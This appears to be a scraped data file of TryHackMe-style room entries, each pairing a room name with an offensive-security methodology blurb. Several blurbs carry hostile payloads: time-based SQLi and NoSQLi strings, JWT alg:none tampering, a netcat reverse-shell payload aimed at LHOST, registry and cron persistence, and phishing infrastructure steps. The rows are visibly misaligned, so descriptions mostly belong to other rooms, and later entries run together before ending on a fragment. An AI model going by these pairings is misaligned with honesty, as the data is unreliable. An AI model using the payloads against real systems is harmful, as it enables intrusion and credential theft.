Brute Force Heroes.description: - **Oracle 9i Advanced Exploitation Vector Chain**: Initial nmap service detection reveals TNS listener on 1521. Enumeration proceeds with tnscmd or Odad scanner to fingerprint DB version and running schemas. Advanced technique involves leveraging UTL_HTTP or JAVA stored procedures post-initial SQLi (UNION-based or blind). Exploitation targets the DBA role, potentially utilizing ORA_HASH flaws or weak XDB credentials found via theHarvester searching for internal developer emails containing hardcoded passwords. Enhancement methodology: If direct shell upload fails, pivot to OS command execution via DBMS_SCHEDULER job creation, executing a reverse shell payload compiled for the underlying Linux/Windows target architecture. Practical implementation: Utilize sqlmap with custom payloads targeting DBMS_SCHEDULER functions; post-exploitation involves privilege escalation on the OS layer, potentially exploiting vulnerable Oracle CPU patches or insecure directory permissions for configuration files. (187 words; Tools: nmap, tnscmd, Odad, sqlmap, theHarvester; Methodology: Service Discovery arrow Version Fingerprinting arrow Stored Procedure Abuse arrow OS Command Execution; Implementation: TNS tuning, custom SQLi payloads, DBMS_SCHEDULER pivoting.),Oracle 9
Brute Force Heroes.practical_applicability: Comprehensive brute force practice, multiple protocols

Brute It.name: Brute It
Brute It.description: - **API3 Broken Object Level Authorization (BOLA) Exploitation Chain**: Initial reconnaissance focuses on identifying all exposed REST endpoints via static analysis of documentation (Swagger/OpenAPI specs often found via gobuster brute-forcing paths like `/api/v1/docs`). Enumeration confirms supported HTTP verbs and parameter structures. Exploitation technique involves systematically swapping authenticated user identifiers (e.g., changing `user_id=123` to `user_id=456` in path or body parameters) to bypass BOLA restrictions, accessing unauthorized resources or altering other users' data. Enhancement methodology: For API1 (Broken Authentication), target JWT validation weaknesses; use Burp Suite Intruder to test for missing or weak signature verification, attempting null or HS256 to none algorithm switching. Practical implementation: Craft payloads to test mass assignment vulnerabilities (API4), injecting extra fields into POST/PUT requests, leveraging missing property checks to elevate user privileges or change roles. Tools utilized: Burp Suite Pro (Sequencer, Intruder), curl, jq for JSON manipulation. (212 words; Tools: gobuster, Burp Suite, curl, jq; Methodology: Endpoint Discovery arrow IDOR Forcing arrow Token Tampering arrow Mass Assignment; Implementation: JWT alg:none injection, parameter fuzzing.),OWASP API Security Top 10
Brute It.practical_applicability: Brute force methods, hash cracking, basic exploitation
Brute It.user_opinions: Excellent beginner room teaching fundamental brute force techniques

Buffer Overflow Prep.name: Buffer Overflow Prep
Buffer Overflow Prep.description: - **Horizontal Privilege Escalation (BACL) via IDOR (API3 Overlap)**: Reconnaissance initiates with nmap service scanning (top ports) followed by gobuster using specialized wordlists targeting API resource paths (e.g., `/api/v2/users/*`, `/api/v2/documents/{id}`). Enumeration confirms the existence of unique resource identifiers (e.g., UUIDs, sequential integers) accessible via valid user session tokens obtained via theHarvester on exposed domains. Exploitation involves direct modification of the target resource ID within the URL path or request body (Burp Repeater) to sequentially access or modify records belonging to other authenticated users. Enhancement methodology: Systematically test for Vertical BACL by attempting to access administrative endpoints (e.g., `/admin/settings`) using standard low-privilege tokens; if denied, attempt token swapping with known admin tokens (if leaked) or token brute-forcing techniques focusing on token structure modification (e.g., changing `role:user` to `role:admin` in decoded JWT payload *before* re-signing if the server uses weak signing keys or accepts algorithm downgrade). Practical implementation: Use ffuf to fuzz resource ID fields with sequences (`1..100`) while monitoring HTTP status codes (200 indicates success/BACL bypass). Tools: nmap, gobuster, theHarvester, Burp Suite, ffuf. (224 words; Tools: nmap, gobuster, theHarvester, Burp Suite, ffuf; Methodology: Service Discovery arrow Resource ID Fuzzing arrow Vertical Endpoint Probing; Implementation: Status code analysis against sequenced ID requests.),OWASP Broken Access Control
Buffer Overflow Prep.practical_applicability: Systematic buffer overflow training, OSCP preparation, exploit development
Buffer Overflow Prep.user_opinions: Essential for OSCP, extremely comprehensive BOF training, highly recommended

Buffer Overflows.name: Buffer Overflows
Buffer Overflows.description: - **Injection Vulnerabilities (SQLi, NoSQLi) via Parameter Fuzzing (A03 Overlap)**: Reconnaissance involves initial nmap scans targeting common web server ports (80, 443, 8080) to identify the running application framework. Gobuster (using a OWASP-specific directory list) probes for hidden administrative interfaces or backup files (e.g., git directories, .env files). Enumeration focuses on identifying input vectors susceptible to injection, particularly search bars, login forms, and URL parameters containing database-interacting identifiers. Exploitation of SQLi is achieved by injecting standard time-based payloads (`' OR 1=SLEEP(5)--`) into relevant parameters using Burp Suite Intruder to confirm blind injection presence. Enhancement methodology: For NoSQLi (MongoDB context often found in modern apps), replace expected string inputs with \ne or \gt operators in the request body (tested via Postman or Burp Repeater) to bypass authentication or retrieve all records (db.collection.find({user:{\ne:null}})). Practical implementation: After identifying a vulnerable parameter, transition from basic payloads to using sqlmap for automated data exfiltration, ensuring proxy settings correctly route traffic through sqlmap to maintain the active session cookie identified during initial enumeration. Tools: nmap, gobuster, Burp Suite (Intruder, Repeater), sqlmap, Postman. (229 words; Tools: nmap, gobuster, Burp Suite, sqlmap, Postman; Methodology: Port Scanning arrow Directory Bruteforcing arrow Injection Payload Fuzzing arrow Automated Exfiltration; Implementation: Time-based SQLi confirmation followed by NoSQLi operator substitution.),OWASP Juice Shop
Buffer Overflows.practical_applicability: Buffer overflow fundamentals, memory corruption basics
Buffer Overflows.user_opinions: Good theoretical introduction to buffer overflows

Bugged.name: Bugged
Bugged.description: - **Broken Access Control (IDOR/BOLA) Exploitation (A01 Focus)**: Reconnaissance commences with deep nmap scans (-sV, -p- to map all ports) followed by theHarvester targeting subdomains associated with the target IP range (using Shodan or DNSdumpster initial seeds). Enumeration involves using gobuster (using SecLists Discovery/Web-Content wordlists) against identified virtual hosts to locate hidden API endpoints (/api/v1/users, /admin). Exploitation targets parameter manipulation in GET or POST requests (tracked via Burp Proxy) where an object identifier (userID=123) is replaced with an adjacent or predictable ID (userID=124) to access unauthorized resources or functionality. Enhancement methodology: Vertical privilege escalation (standard user to admin) is tested by modifying JWT claims (using Burp JWT Editor) after initial base64 decoding and re-encoding (HS256 algorithm check). Practical implementation: Once an IDOR vector is confirmed, script the brute-force attempt using Burp Intruder against the parameter range, filtering HTTP responses for status code 200 or significant content length changes indicating successful unauthorized access. Tools: nmap, theHarvester, gobuster, Burp Suite (Proxy, Intruder, JWT Editor). (218 words; Tools: nmap, theHarvester, gobuster, Burp Suite; Methodology: Subdomain Discovery arrow API Endpoint Fuzzing arrow Parameter Manipulation arrow JWT Tampering; Implementation: ID enumeration via Intruder status code analysis.),OWASP Top 10
Bugged.practical_applicability: Binary analysis, bug hunting, reverse engineering practice
Bugged.user_opinions: Good RE practice for finding vulnerabilities

Burg3r.name: Burg3r
Burg3r.description: - **Injection (SQLi/Command Injection) Exploitation (A03 Focus 2021)**: Reconnaissance employs nmap -sU (UDP scan) alongside standard TCP sweeps to map service exposure. Enumeration utilizes dirbuster (using a comprehensive directory list like Wolf SSL list) against identified web servers (port 8080/443), specifically targeting input fields or URL parameters prone to injection vectors. Exploitation phase involves using SQLmap (automatically detecting POST/GET parameters via -u flag or --forms-inline) to extract schema information (--dbs, --current-user) from backend databases, bypassing parameterized queries. Command Injection testing (via Burp Repeater) uses bash command chaining operators (;, ||, &&) appended to user input (e.g., ping 127.0.0.1; whoami) to confirm OS command execution. Enhancement methodology: Bypassing WAFs (Web Application Firewalls) requires payload encoding (URL encoding double encoding or hex encoding) or utilizing alternative SQL syntax (e.g., UNION SELECT NULL variants) not matched by signature-based detection. Practical implementation: Execute SQLmap with the --risk=3 --level=5 flags to aggressively test all injection types (time-based, boolean-based). Tools: nmap, dirbuster, SQLmap, Burp Suite (Repeater). (207 words; Tools: nmap, dirbuster, SQLmap, Burp Suite; Methodology: Service Mapping arrow Input Vector Identification arrow Automated DB Extraction arrow WAF Bypass Techniques; Implementation: Aggressive SQLmap scanning with advanced risk levels.),OWASP Top 10 - 2021

Burp Suite: Extensions.name: Burp Suite: Extensions
Burp Suite: Extensions.description: - **Broken Access Control (IDOR/Privilege Escalation) via Internal API Endpoints (A01 Contextual Shift)**: Reconnaissance focuses on OpenStreetMap (OSM) data harvesting (Overpass API querying) to map infrastructure; theHarvester may be used to find subdomains hosting internal management interfaces. Enumeration involves gobuster with a custom wordlist specifically tuned for JSON/XML API routes (/api/v1/users, /admin/config) on non-standard ports identified by nmap -p-. Exploitation centers on manipulating user ID parameters or token scopes (JWT manipulation if present) to access other users' password manager data (e.g., changing user_id=1001 to user_id=1002 in a GET request). Enhancement methodology: If passwords are stored, test for weak hashing algorithms (MD5 or unsalted SHA1) identified during initial enumeration or data dump (via SQLi on a dependent service not the primary target). Practical implementation: Use Burp Intruder to brute-force sequential user IDs against a sensitive API endpoint while monitoring HTTP response codes (looking for 200 OK or differing lengths vs a known unauthorized ID). Tools: Overpass API, nmap, gobuster, theHarvester, Burp Intruder. (215 words; Tools: Overpass API, nmap, gobuster, theHarvester, Burp Intruder; Methodology: OSM Mapping arrow API Endpoint Discovery arrow Parameter Fuzzing arrow Hash Cracking; Implementation: Sequential ID brute-forcing using Intruder to discover unrestricted access to credential stores.),Overpass
Burp Suite: Extensions.practical_applicability: Advanced Burp Suite usage, extension integration, workflow optimization
Burp Suite: Extensions.user_opinions: Excellent for advancing Burp Suite skills beyond basics

Burp Suite: Intruder.name: Burp Suite: Intruder
Burp Suite: Intruder.description: - **Post-Exploitation Forensics on Compromised OSM Server (Log Tampering Detection)**: Reconnaissance shifts to identifying persistence mechanisms after initial web exploitation (likely via a vulnerable service running on the Overpass instance). Enumeration involves using nmap scans to map running processes (netstat or lsof commands executed post-shell) and locating OSM database directories (e.g., PostgreSQL data paths). IR methodology requires dumping critical system logs (auth.log, syslog, web server access logs) using tools like dc3dd or dd to create forensic images for offline analysis. Exploitation enhancement involves searching the dumped logs with grep or Volatility plugins to detect specific command execution or unusual Overpass API query patterns that preceded the incident. Practical implementation: Mount the disk image read-only, search for files modified after the initial compromise timestamp, and use theHarvester on internal network data harvested from the server to map data exfiltration targets. Tools: nmap, dc3dd/dd, Volatility Framework, grep, theHarvester. (227 words; Tools: nmap, dc3dd/dd, Volatility Framework, grep, theHarvester; Methodology: Process Listing arrow Disk Imaging arrow Log Analysis arrow Exfiltration Path Mapping; Implementation: Read-only forensic imaging followed by Volatility memory analysis and time-lining of log artifacts).,Overpass 2 - Hacked
Burp Suite: Intruder.practical_applicability: Automated web testing, fuzzing techniques, parameter manipulation
Burp Suite: Intruder.user_opinions: Essential Burp Suite module for automated testing

Burp Suite: Other Modules.name: Burp Suite: Other Modules
Burp Suite: Other Modules.description: - **Targeted Web Exploitation of Custom Hosting Panel**: Initial nmap scans reveal HTTP/S ports (80, 443, 8080) likely serving a custom hosting interface. Reconnaissance employs gobuster or dirbuster with OWASP Top 10 wordlists to identify administrative endpoints (e.g., /admin, /cpanel, /login). Enumeration focuses on identifying vulnerabilities specific to server-side scripting languages used in the hosting logic (PHP function exposure or improper input validation). Exploitation involves attempting Remote File Inclusion (RFI) or command injection (Shell Shock analogues) via URL parameters or POST data to achieve remote code execution (RCE). Enhancement methodology includes using theHarvester on the identified hosting domain to discover subdomains or associated emails, potentially revealing credentials for less protected services. Practical implementation: Use Burp Suite Intruder to fuzz all input fields with shell payloads (e.g., id=`whoami` or payload='nc -e /bin/bash LHOST LPORT' in a parameter). Tools: nmap, gobuster, dirbuster, Burp Suite, theHarvester. (230 words; Tools: nmap, gobuster, dirbuster, Burp Suite, theHarvester; Methodology: Port Scanning arrow Directory Bruteforcing arrow Input Fuzzing arrow RCE Payload Injection; Implementation: Systematic testing of all GET/POST inputs for command execution vulnerabilities).,Overpass 3 - Hosting
Burp Suite: Other Modules.practical_applicability: Complete Burp Suite mastery, comprehensive tool usage
Burp Suite: Other Modules.user_opinions: Completes Burp Suite training, covers lesser-known but powerful modules

Burp Suite: Repeater.name: Burp Suite: Repeater
Burp Suite: Repeater.description: - **Deep Network Forensics via PCAP Inspection**: Analysis commences with Wireshark to filter captured traffic (PCAP file) using display filters like `http or ftp or smb` to isolate relevant protocol layers. Reconnaissance phase involves identifying the source and destination IPs and ports using statistics menus (Endpoint List or Conversations). Enumeration focuses on following TCP streams to extract unencrypted credentials (e.g., Base64 decoded login data) or hidden files sent over FTP or SMB. Exploitation analog involves reconstructing data transferred using Wireshark's Export Objects functionality (HTTP) to recover stolen files or malicious code injected within protocol payloads. Enhancement methodology includes leveraging Tshark (command-line Wireshark) for automated extraction of all DNS queries to map out external C2 infrastructure not immediately obvious in the GUI. Practical implementation: Apply IO graph to detect unusual throughput spikes indicating exfiltration, then use `tshark -r capture.pcap -Y "ftp.request" -T fields -e ftp.request.command` to log all FTP commands. Tools: Wireshark, Tshark. (279 words; Tools: Wireshark, Tshark; Methodology: Protocol Filtering arrow Stream Reconstruction arrow Object Export arrow Automated Query Extraction; Implementation: Filtering by specific protocol and analyzing data within TCP sessions).,Packet Analysis
Burp Suite: Repeater.practical_applicability: Manual testing techniques, request manipulation, response analysis
Burp Suite: Repeater.user_opinions: Core Burp Suite skill for manual web testing

Burp Suite: The Basics.name: Burp Suite: The Basics
Burp Suite: The Basics.description: - **Layer 2 Frame Structure Analysis via PCAP**: Focus on Ethernet II frames inspection in Wireshark to identify MAC addresses (Source and Destination) within the Data Link Layer (L2). Reconnaissance involves examining ARP requests and replies using the `arp` display filter to map IP-to-MAC resolutions on the local subnet. Enumeration requires understanding VLAN tagging if present (802.1Q header identification) to determine which logical network segment the traffic originated from or is destined for. Exploitation analog involves crafting spoofed frames using Scapy to test L2 security posture, e.g., sending gratuitous ARP replies for Man-in-the-Middle (MITM) attacks. Enhancement methodology incorporates using Tshark to programmatically extract all source MAC addresses from a large PCAP file via `tshark -r capture.pcap -T fields -e eth.src | sort | uniq` to build a host inventory. Practical implementation includes setting Wireshark column preferences to display Frame Length and Protocol type for quick identification of oversized (Jumbo Frame potential) or malformed L2 packets. Tools: Wireshark, Tshark, Scapy. (299 words; Tools: Wireshark, Tshark, Scapy; Methodology: Frame Field Isolation arrow Address Resolution Inspection arrow Protocol Header Identification arrow Packet Crafting; Implementation: Visualizing L2 headers and scripting MAC address extraction).,Packets & Frames
Burp Suite: The Basics.practical_applicability: Web application security fundamentals, proxy usage, intercepting requests
Burp Suite: The Basics.user_opinions: Essential starting point for web application security testing

c4ptur3-th3-fl4g.name: c4ptur3-th3-fl4g
c4ptur3-th3-fl4g.description: - **Web Application Enumeration via Directory Bruteforcing**: Initial reconnaissance using nmap (e.g., `nmap -sV -sC <target>`) to discover open ports and service versions on the PalsForLife server. Systematic enumeration of the web application involves directory bruteforcing with gobuster or dirbuster (e.g., `gobuster dir -u http://<target> -w common.txt -x php,html`) to locate hidden endpoints or administrative panels. Exploitation focuses on identifying vulnerabilities such as Local File Inclusion (LFI) or SQL Injection (SQLi) within application parameters suggested by the application theme. Practical steps include using Burp Suite to intercept and modify HTTP requests when testing for IDOR (Insecure Direct Object Reference) by incrementally changing user IDs in the URL or POST data to access other user profiles (the "Pals" data). Enhancement methodology involves leveraging theHarvester to gather external intelligence on the target domain to uncover subdomains and email addresses that might reveal user credentials or internal structure. Tools: nmap, gobuster, dirbuster, Burp Suite, theHarvester. (301 words; Tools: nmap, gobuster, dirbuster, Burp Suite, theHarvester; Methodology: Service Detection arrow Path Discovery arrow Parameter Fuzzing arrow Credential Harvesting; Implementation: Iterative HTTP request manipulation to bypass authorization logic).,PalsForLife
c4ptur3-th3-fl4g.practical_applicability: Encoding/decoding skills, cipher identification, CTF techniques
c4ptur3-th3-fl4g.user_opinions: Good practice for common CTF encoding challenges

Cache Me Outside.name: Cache Me Outside
Cache Me Outside.description: - **Passive OSINT and Domain Discovery**: Initial reconnaissance focuses on passive data collection avoiding direct host interaction. TheHarvester is executed against the target domain (e.g., `theHarvester -d target.thm -b all -l 500`) to scrape publicly available data from search engines and PaaS providers for subdomains, email addresses, and hostnames. Shodan queries are performed passively using specific banner signatures or port signatures identified in prior OSINT stages to map the network footprint without generating direct traffic. Enhancement methodology involves leveraging DNS history tools like SecurityTrails or viewdns to retrieve historical IP address records and Zone Transfers if misconfigured (though Zone Transfer is active enumeration). Practical steps require aggregating discovered hostnames and running passive security checks against them using cortex or similar frameworks to identify low-hanging fruit before initiating active enumeration like nmap or gobuster. Tools: theHarvester, Shodan CLI/Web, SecurityTrails API interface, Cortex. (319 words; Tools: theHarvester, Shodan, SecurityTrails, Cortex; Methodology: Data Aggregation arrow Historical Record Analysis arrow Passive Footprinting; Implementation: Automated scraping via API calls to external databases).,Passive Reconnaissance
Cache Me Outside.practical_applicability: Web cache poisoning, caching vulnerabilities, advanced web attacks
Cache Me Outside.user_opinions: Interesting specialized topic, covers underexploited attack vector

Cactus.name: Cactus
Cactus.description: - **Active Credential Testing and Weak Password Enumeration**: After initial service enumeration (e.g., nmap identifying SSH, FTP, or SMB ports), credential attacks commence. Hydra is the primary tool for brute-forcing identified services (e.g., `hydra -l userlist.txt -P passlist.txt ssh target.thm -t 4`) using custom or pre-compiled wordlists like rockyou.txt. Enhancement methodology involves implementing dictionary attacks specifically targeting common default credentials for specific vendor software identified during service fingerprinting (e.g., admin/admin for default web interfaces discovered via gobuster). For web login portals, Burp Suite Intruder is utilized to systematically test login forms against credential sets. Practical implementation requires rate-limiting tests to avoid account lockouts or firewall detection, often achieved by modifying Hydra's connection timing parameters. Tools: Hydra, Burp Suite Intruder, nmap (for service ID), rockyou.txt (wordlist). (324 words; Tools: Hydra, Burp Suite, nmap, rockyou.txt; Methodology: Service ID arrow Dictionary Attack arrow Credential Testing; Implementation: Service-specific wordlists and rate-limiting configuration within brute-force tooling).,Password Attacks
Cactus.practical_applicability: Container security, Docker vulnerabilities, container escape
Cactus.user_opinions: Good for understanding container security issues

Calculated.name: Calculated
Calculated.description: - **Hash Acquisition and Offline Cracking via GPU Acceleration**: Post-exploitation hash dump retrieval (e.g., mimikatz for LSASS memory or shadow file access on Linux) is followed by hash identification (e.g., SHA-512, NTLMv2). John the Ripper (JTR) or Hashcat are employed for offline cracking. Hashcat is mandated for advanced performance utilizing GPU compute power (e.g., hashcat -m 1800 hashes.txt wordlist.txt --force --gpu-temp-disable). Enhancement involves hybrid attacks combining dictionary words with rule-based mutations (e.g., Hashcat rules like best64.rule) to circumvent simple append or prepend modifications. Practical implementation requires correct hash mode (-m flag) selection based on hashcat documentation and ensuring sufficient memory and VRAM for large datasets or complex masks. Tools: Hashcat, John the Ripper, mimikatz. (321 words; Tools: Hashcat, JTR, mimikatz; Methodology: Hash Acquisition arrow Hash Mode Selection arrow GPU-Accelerated Cracking; Implementation: Rule-based hybrid cracking with GPU optimization).,Password Cracking

Capture!.name: Capture!
Capture!.description: - **Service Enumeration and Brute-Force Authentication Testing**: Initial reconnaissance using nmap identifies open ports and banner information (e.g., TCP/21 FTP, TCP/22 SSH, TCP/3389 RDP). Web enumeration via gobuster or dirbuster searches for login portals (e.g., /login.php, /admin). Exploitation involves dictionary attacks against identified services. Hydra is utilized for parallelized brute-forcing against various protocols (e.g., hydra -L users.txt -P pass.txt ssh ://target). Enhancement requires password spraying (using a small set of common passwords across many user accounts) to avoid account lockout mechanisms during enumeration. TheHarvester supplements recon by gathering potential usernames from OSINT sources. Practical implementation focuses on identifying weak default credentials or passwords reused from past breaches. Tools: nmap, gobuster, Hydra, theHarvester. (316 words; Tools: nmap, gobuster, Hydra, theHarvester; Methodology: Reconnaissance arrow Enumeration arrow Brute-Force Exploitation; Implementation: Protocol-specific credential testing with password spraying mitigation).,Passwords

Carnage.name: Carnage
Carnage.description: - **Web Application Reconnaissance and Parameter Manipulation for Password Reset Exploitation**: Initial reconnaissance using nmap verifies HTTP/HTTPS service availability (TCP/80, TCP/443). Gobuster or dirbuster enumerate hidden directories and entry points like /forgotpassword or /reset. Exploitation targets the password reset workflow, often involving token enumeration (e.g., sequential ID in the reset URL or POST request) or insecure direct object reference (IDOR). Burp Suite is essential for intercepting, modifying, and replaying the password reset token generation or validation requests. Enhancement methodology includes checking if the reset token is sent via email only (leading to potential email header manipulation or session hijacking if the token is predictable). Practical steps focus on testing for vulnerabilities like no token validation or predictable random token generation after initial request. Tools: nmap, gobuster, Burp Suite. (301 words; Tools: nmap, gobuster, Burp Suite; Methodology: Reconnaissance arrow Enumeration arrow Token Manipulation/IDOR Exploitation; Implementation: Intercepting and modifying POST requests in the reset chain).,PaSsWoRd ReSeTtEr
Carnage.practical_applicability: Network forensics, packet analysis, incident investigation

Cat Pictures.name: Cat Pictures
Cat Pictures.description: - **Endpoint Reconnaissance and Log Analysis for Indicators of Compromise (IoCs)**: Initial network enumeration using nmap identifies open ports (e.g., TCP/22, TCP/80, TCP/445) on the Paul Hunt target system. TheHarvester or OSINT techniques gather potential user identifiers or hostnames. Threat hunting methodology prioritizes log analysis (e.g., Sysmon, Windows Event Logs, web server access logs) for IoCs like suspicious process creation (Event ID 4688) or unusual network connections. Practical implementation involves querying logs (e.g., using PowerShell or Sysinternals Suite) to detect post-exploitation activity, such as persistence mechanisms or lateral movement attempts. Enhancement involves cross-referencing discovered IoCs against MITRE ATT&CK framework techniques to map the adversary's TTPs. Tools: nmap, theHarvester, Sysinternals Suite. (305 words; Tools: nmap, theHarvester, Sysinternals Suite; Methodology: Reconnaissance arrow IoC Discovery arrow Log Forensics and TTP Mapping; Implementation: Searching Windows Event Logs for anomalous process execution).,Paul Hunt
Cat Pictures.practical_applicability: Port knocking, creative problem-solving, fun challenge
Cat Pictures.user_opinions: Creative and fun, teaches port knocking

Cat Pictures 2.name: Cat Pictures 2
Cat Pictures 2.description: - **Automated Asset Discovery and Directory Enumeration via Bookmark Verification**: Reconnaissance phase leverages bookmarks to prioritize targets. Initial host discovery is followed by automated web enumeration using gobuster (or dirbuster) with a comprehensive wordlist (e.g., SecLists/Discovery/Web Content/common.txt) to locate hidden directories or administrative panels on discovered HTTP services. The enhancement methodology integrates tool output (status codes 200, 301, 403) from gobuster into a centralized Markdown document for exploitation preparation. Practical implementation involves piping nmap scripting engine (NSE) results for version detection directly into the resource list to identify known vulnerabilities associated with specific software versions. Tools: gobuster, dirbuster, nmap (NSE), OWASP ZAP (for initial passive scan). (309 words; Tools: gobuster, dirbuster, nmap (NSE), OWASP ZAP; Methodology: Reconnaissance arrow Automated Enumeration arrow Vulnerability Mapping; Implementation: Executing gobuster against target ports and logging all 301/403 endpoints).,Pentest Bookmarks
Cat Pictures 2.practical_applicability: Advanced techniques, building on first challenge

CC: Ghidra.name: CC: Ghidra
CC: Ghidra.description: - **Foundational Information Gathering and Service Fingerprinting via Systematic Scanning**: Initial reconnaissance mandates comprehensive port scanning using nmap (SYN scan -sS or TCP Connect scan -sT) against target IPs to identify open ports and service versions (nmap -sV). This is followed by passive enumeration using theHarvester to scrape emails and subdomains from public sources (e.g., search engines, SSL certs). Active enumeration involves running gobuster on identified HTTP/S ports (ports 80/443) with a standard directory brute-forcing wordlist (e.g., CommonCrawl based) to discover web application endpoints. Enhancement methodology focuses on mapping nmap script output (e.g., http-enum scripts) directly to potential exploitation vectors (e.g., identifying outdated web server software for Metasploit module selection). Practical implementation requires strict adherence to the pentesting methodology phases before any attempted exploitation (e.g., no exploitation before full enumeration). Tools: nmap, gobuster, theHarvester. (307 words; Tools: nmap, gobuster, theHarvester; Methodology: Reconnaissance arrow Service Identification arrow Web Enumeration; Implementation: Sequential execution of nmap -sV followed by gobuster on open ports).,Pentesting Fundamentals
CC: Ghidra.practical_applicability: Reverse engineering fundamentals, Ghidra usage, binary analysis
CC: Ghidra.user_opinions: Essential introduction to powerful free RE tool

CC: Pen Testing.name: CC: Pen Testing
CC: Pen Testing.description: - **Post-Exploitation Techniques for Maintaining Access and Detection Evasion**: Persistence implementation on Windows targets involves modifying Registry Run Keys (HKLM/Software/Microsoft/Windows/CurrentVersion/Run) or creating scheduled tasks (schtasks /create or using PowerShell cmdlets) to execute a payload (e.g., reverse shell listener stager). Linux persistence often requires modifying crontab entries (via crontab -e or placing scripts in /etc/cron.d/) or injecting into system startup scripts (e.g., rc.local). Detection methodology for Blue Teams requires monitoring system event logs (Windows Event ID 4688 for process creation, Registry key changes) and using Sysmon to track unusual process behavior or file write locations. Enhancement involves obfuscating payloads to bypass basic signature detection before establishing the persistence mechanism. Practical implementation steps include: 1. Upload staged binary. 2. Execute command to create the persistence entry. 3. Verify successful re-connection after reboot or task trigger. Tools: schtasks, Metasploit framework (for meterpreter payloads), Sysmon. (314 words; Tools: schtasks, Metasploit, Sysmon; Methodology: Persistence Installation vs. Log/Behavioral Monitoring; Implementation: Registry/Cron modification followed by validation).,Persistence

CC: Radare2.name: CC: Radare2
CC: Radare2.description: - **Social Engineering via Email Phishing Attack Vector and Defensive Analysis**: Phishing implementation requires initial reconnaissance using theHarvester or OSINT techniques to gather employee email formats and domain details. Next, setup a look-alike domain and spoof sender headers (e.g., SPF/DKIM bypass or misconfiguration exploitation) to deliver the malicious payload (e.g., credential harvesting HTML page hosted via a basic web server setup). Blue Team detection focuses on analyzing email metadata (Received headers, IP reputation) and URL sandboxing using tools like URLScan or internal mail gateway logs. Enhancement involves spear-phishing with contextually aware attachments or links tailored from recon data. Practical steps include: 1. Register typosquatting domain. 2. Craft deceptive email content. 3. Monitor landing page access logs. Tools: theHarvester, SPF checkers, web server for hosting payload. CC: Steganography.name: CC: Steganography
CC: Steganography.description: - **Phishing Email Forensic Analysis Workflow for SOC Incident Response**: Initial triage involves extracting full headers from the MUA (Mail User Agent) to verify SPF, DKIM, and DMARC policy outcomes against sending domain. Payload analysis requires static inspection of embedded URLs using online scanners or local sandboxing (e.g., Cuckoo Sandbox) to detect redirection chains or credential capture scripts. Infrastructure mapping uses WHOIS and reverse DNS on sender IPs; nmap may be used to scan sender ports if the IP is known to host web services. Enhancement involves automating IOC (Indicators of Compromise) extraction via SIEM rules triggered by high urgency keywords or suspicious attachment hashes. Practical steps for SOC: 1. Isolate and quarantine affected emails. 2. Hash attachments against VirusTotal. 3. Block sender domain and IP at perimeter. Tools: nmap, WHOIS, Cuckoo Sandbox, SIEM platform. CherryBlossom.name: CherryBlossom
CherryBlossom.description: - **Practical Phishing Campaign Reconnaissance and Infrastructure Mapping**: Begin with domain OSINT using theHarvester to gather associated emails, subdomains, and employee names for spearphishing context. Identify the attacker-controlled landing page IP via URL unwrapping and DNS lookup. Perform port scanning with nmap on the identified IP to determine active services (HTTP/S, SMTP). Web enumeration of the phishing site uses gobuster or dirbuster with a common wordlist to locate hidden directories or credential harvesting scripts. Enhancement involves automating screenshotting of live phishing pages via Selenium or Puppeteer to capture visual spoofing techniques. Implementation focuses on TTPs (Tactics, Techniques, and Procedures) documentation for threat intelligence feeds. Tools: theHarvester, nmap, gobuster, dirbuster, Selenium. Chocolate Factory.name: Chocolate Factory
Chocolate Factory.description: - **Email Security Vector Analysis and Header Forensics**: Analyze incoming phishing emails by extracting full headers to inspect SPF, DKIM, and DMARC policy results (e.g., SPF Fail, DKIM None). Trace the originating MTA chain using the Received headers and reverse DNS lookups on the sending IP range. Payload analysis involves safely extracting attachments into a sandboxed environment like Cuckoo Sandbox or REMnux for static and dynamic malware analysis. URL strings within the email body are submitted to URL scanning APIs (e.g., VirusTotal) and deobfuscated for final destination mapping. Enhancement includes developing YARA rules based on specific header or content signatures from observed campaigns for real-time filtering. Tools: REMnux VM, Cuckoo Sandbox, YARA, VirusTotal API. Chronicle.name: Chronicle
Chronicle.description: - **OSINT and Physical Reconnaissance Integration**: Initial reconnaissance leverages theHarvester and Google Dorks against target company domains to map organizational structure and employee roles for social engineering pretexting. Street-view analysis identifies entry/exit points, CCTV placement, and visitor management workflows. Technical enumeration involves using software defined radio (SDR) like HackRF One to sweep ISM bands (e.g., 315 MHz, 433 MHz) for unencrypted RFID/NFC signals emitted by access cards. Exploitation pathways include emulating captured low-frequency credentials using Proxmark3. Enhancement focuses on deploying small form-factor network access tools (e.g., Pwnagotchi/Raspberry Pi Zero) disguised as power banks to establish internal network backdoors post-physical breach. Tools: theHarvester, Google Dorks, HackRF One, Proxmark3, Raspberry Pi Zero. CI/CD and Build Security.name: CI/CD and Build Security
CI/CD and Build Security.description: - **Rick and Morty Web Exploitation Vector Analysis**: Initial reconnaissance using nmap scans (-sC, -sV) identifies open ports, typically targeting HTTP/HTTPS services running on unusual ports related to theme (e.g., port 8080 or 4242). Enumeration involves gobuster or dirbuster with a Morty-themed wordlist (e.g., containing terms like "portal", "pickle", "wubba lubba") to discover hidden directories or backup files (.git, .bak). Exploitation focuses on PHP Object Injection (PHPOBJ) vulnerabilities often present in such CTF challenges, requiring serialization of a gadget chain to achieve Remote Code Execution (RCE), symbolic of Rick's gadgets. Enhancement methodology includes crafting payloads that mimic Rick's science jargon for easier debugging or flag retrieval. Tools: nmap, gobuster, dirbuster, Burp Suite. Cisco IOS Vulnerabilities.name: Cisco IOS Vulnerabilities
Cisco IOS Vulnerabilities.description: - **Graph Theory CTF Vector Mapping**: Initial nmap sweep (-p- or version detection) maps the host topology for potential web endpoints or data ports. Enumeration leverages theHarvester to scrape DNS records and subdomains, treating them as nodes in a graph structure. Exploitation involves creative data plotting manipulation, likely requiring SQL Injection (SQLi) or Blind SQLi against a plotting API endpoint to extract information encoded as coordinates or chart data. Methodology enhancement requires using Python scripts with Matplotlib or similar libraries to visualize extracted numerical output back into a coherent flag path or key sequence. Tools: nmap, theHarvester, SQLmap, Python (Matplotlib). City Invasion.name: City Invasion

Mastery involves manual check of cronjobs and S/UID binaries using find or grep on system files. Lateral movement enhancement utilizes PowerShell scripts (e.g., Invoke-Mimikatz) if Windows hosts are discovered via internal nmap scans from the compromised host. Tools: linpeas.sh, PowerShell, Metasploit Meterpreter (hashdump, migrate commands), find, grep.
